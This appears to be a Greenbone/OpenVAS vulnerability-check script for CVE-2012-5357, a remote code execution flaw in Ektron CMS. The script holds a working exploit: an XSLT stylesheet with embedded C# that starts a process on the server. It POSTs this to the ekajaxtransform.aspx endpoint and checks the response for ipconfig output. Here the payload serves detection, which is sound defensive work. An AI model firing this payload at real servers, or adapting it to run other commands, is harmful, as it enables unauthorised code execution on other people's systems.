if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.103624" );
	script_bugtraq_id( 56816 );
	script_cve_id( "CVE-2012-5357" );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_version( "2021-08-27T12:01:24+0000" );
	script_name( "Ektron CMS 'XslCompiledTransform' Class Remote Code Execution Vulnerability" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/56816" );
	script_tag( name: "last_modification", value: "2021-08-27 12:01:24 +0000 (Fri, 27 Aug 2021)" );
	script_tag( name: "severity_vector", value: "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H" );
	script_tag( name: "severity_origin", value: "NVD" );
	script_tag( name: "severity_date", value: "2017-11-18 17:39:00 +0000 (Sat, 18 Nov 2017)" );
	script_tag( name: "creation_date", value: "2012-12-10 11:13:54 +0100 (Mon, 10 Dec 2012)" );
	script_category( ACT_ATTACK );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_family( "Web application abuses" );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_copyright( "Copyright (C) 2012 Greenbone Networks GmbH" );
	script_dependencies( "find_service.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_tag( name: "solution", value: "Updates are available. Please see the references for details." );
	script_tag( name: "summary", value: "Ektron CMS is prone to a remote code-execution vulnerability." );
	script_tag( name: "impact", value: "Successful exploits will allow remote attackers to execute arbitrary
code within the context of the affected application. Failed attacks
may cause denial-of-service conditions." );
	script_tag( name: "affected", value: "Versions prior to Ektron CMS 8.02 Service Pack 5 are vulnerable." );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
require("url_func.inc.sc");
port = http_get_port( default: 80 );
if(!http_can_host_asp( port: port )){
	exit( 0 );
}
host = http_host_name( port: port );
ex = "<?xml version=\"1.0\"?>\n" + "<xsl:stylesheet version=\"1.0\"\n" + "xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\"\n" + "xmlns:msxsl=\"urn:schemas-microsoft-com:xslt\"\n" + "xmlns:user=\"http://mycompany.com/mynamespace\">\n" + "<msxsl:script language=\"C#\" implements-prefix=\"user\">\n" + "<![CDATA[\n" + "public string xml()\n" + "{\n" + "System.Diagnostics.Process proc = new System.Diagnostics.Process();\n" + "proc.StartInfo.UseShellExecute = false;\n" + "proc.StartInfo.RedirectStandardOutput = true;\n" + "proc.StartInfo.FileName = \"ipconfig.exe\";\n" + "proc.Start();\n" + "proc.WaitForExit();\n" + "return proc.StandardOutput.ReadToEnd();\n" + "}\n" + "]]>\n" + "</msxsl:script>\n" + "<xsl:template match=\"/\">\n" + "<xsl:value-of select=\"user:xml()\"/>\n" + "</xsl:template>\n" + "</xsl:stylesheet>";
ex_encoded = "xml=AAA&xslt=" + urlencode( str: ex );
len = strlen( ex_encoded );
for dir in nasl_make_list_unique( "/cms", "/cms400min", "/cms400.net", "/cms400", http_cgi_dirs( port: port ) ) {
	if(dir == "/"){
		dir = "";
	}
	url = dir + "/WorkArea/ContentDesigner/ekajaxtransform.aspx";
	req = NASLString( "POST ", url, " HTTP/1.1\\r\\n", "Host: ", host, "\\r\\n", "Pragma: no-cache\\r\\n", "Referer: http://", host, "/\\r\\n", "Connection: Close\\r\\n", "Content-Type: application/x-www-form-urlencoded;\\r\\n", "Content-Length: ", len, "\\r\\n", "\\r\\n", ex_encoded );
	res = http_keepalive_send_recv( port: port, data: req, bodyonly: FALSE );
	if(eregmatch( pattern: "Windows.IP..onfiguration", string: res )){
		report = http_report_vuln_url( port: port, url: url );
		security_message( port: port, data: report );
		exit( 0 );
	}
}
exit( 99 );

